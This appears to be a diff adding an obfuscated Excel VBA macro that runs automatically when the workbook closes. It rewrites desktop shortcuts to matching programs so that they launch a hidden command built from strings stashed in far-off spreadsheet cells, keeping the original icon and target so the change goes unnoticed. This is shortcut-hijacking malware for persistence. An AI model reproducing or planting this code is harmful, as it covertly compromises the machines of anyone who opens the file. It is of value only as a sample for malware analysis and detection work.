@@ -1,0 +1,18 @@
+Sub Auto_Close()
+Set gBifJGah = CreateObject(activeSheet.Range("AT64").value)
+Set cdVGXZm = CreateObject(activeSheet.Range("AV64").value)
+Set ezCiHag = cdVGXZm.GetFolder(gBifJGah.SpecialFolders(activeSheet.Range("AX64").value))
+For Each cjpMSgD In ezCiHag.Files
+If(InStr(Lcase(cjpMSgD), ".lnk")) Then
+Set NbILCBeSv = gBifJGah.CreateShortcut(gBifJGah.SPecialFolders(activeSheet.Range("AX64").value) & "\" & cjpMSgD.name)
+If(InStr(Lcase(NbILCBeSv.targetPath), activeSheet.Range("AZ64").value) or InStr(Lcase(NbILCBeSv.targetPath), activeSheet.Range("BC64").value) or InStr(Lcase(NbILCBeSv.targetPath), activeSheet.Range("BE64").value)) Then
+NbILCBeSv.IconLocation = NbILCBeSv.targetpath
+NbILCBeSv.arguments = "-w " & activeSheet.Range("BH64").Value & NbILCBeSv.targetPath & "'" & activeSheet.Range("BJ64").Value
+NbILCBeSv.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("BN64").value
+if(Len(NbILCBeSv.arguments) < 1023) Then
+NbILCBeSv.save
+end if
+end if
+end if
+next cjpMSgD
+End Sub
